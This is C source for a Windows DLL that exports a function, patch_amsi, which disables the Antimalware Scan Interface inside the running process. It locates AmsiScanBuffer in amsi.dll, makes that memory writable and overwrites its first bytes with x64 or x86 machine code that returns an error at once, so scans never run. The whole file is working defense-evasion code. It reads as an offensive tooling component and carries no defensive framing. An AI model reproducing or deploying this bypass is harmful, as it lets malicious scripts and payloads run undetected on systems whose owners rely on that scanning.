// cl.exe /D_USRDLL /D_WINDLL patcher.c /MT /link /DLL /OUT:patcher.dll
#include <Windows.h>
#include <windef.h>
#include "patcher.h"
#include "rewrite.h"
#include "userfuncs.h"
#pragma comment (lib, "user32.lib")


BOOL APIENTRY DllMain(HMODULE _hModule,  DWORD  ul_reason_for_call, LPVOID _lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}


EXPORT int WINAPI patch_amsi() {
    #if defined(_M_X64)
        printf("[i] Architecture\t\tx86_64\n");
        // https://defuse.ca/online-x86-assembler.htm#disassembly
        // mov eax, 0x80070057
        // ret
        // xor eax, eax
        // mov eax, 0x11111111
        // xor eax, 0x91161146
        // ret
        unsigned char patch_bytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    #elif defined(_M_IX86) || defined(__i386__)
        printf("[i] Architecture\tx86\n");
        // mov eax, 0x80070057
        // ret 0x18
        unsigned char patch_bytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    #else
        fprintf(stderr, "[!] Unsupported Architecture!\n");
        return -1;
    #endif

    printf("[i] Bytes to write\t\t");
    phex(patch_bytes, (int)(sizeof(patch_bytes)/sizeof(patch_bytes[0])));
    nl();

    HMODULE amsi_dll_handle = LoadLibrary("amsi.dll");
    if (NULL == amsi_dll_handle) {
        fprintf(stderr, "[!] Failed to load amsi.dll(Error Code: %d)\n", GetLastError());
        return -2;
    }

    FARPROC amsi_scan_buffer_base_addr = __get_proc_address(amsi_dll_handle, "AmsiScanBuffer");
    if (NULL == amsi_scan_buffer_base_addr) {
        fprintf(stderr, "[!] Failed to get base address of AmsiScanBuffer(Error Code: %d)\n", GetLastError());
        return -3;
    }
    
    printf("[i] AmsiScanBuffer Offset\t0x%p\n", amsi_scan_buffer_base_addr);
    DWORD oldprotect;
    BOOL _vp = VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
                                sizeof(patch_bytes),
                                PAGE_EXECUTE_READWRITE,
                                &oldprotect);
    if (!_vp){
        fprintf(stderr, "[!] VirtualProtect Failed(Error Code: %d)\n", GetLastError());
        return -2;
    } 

    memcpy(amsi_scan_buffer_base_addr, patch_bytes, sizeof(patch_bytes));
    
    DWORD _temp;
    _vp = VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
                                sizeof(patch_bytes),
                                oldprotect,
                                &_temp);
    if (!_vp){
        fprintf(stderr, "[!] VirtualProtect Failed(Error Code: %d)\n", GetLastError());
        return -3;
    } 
    
	return 0;
}

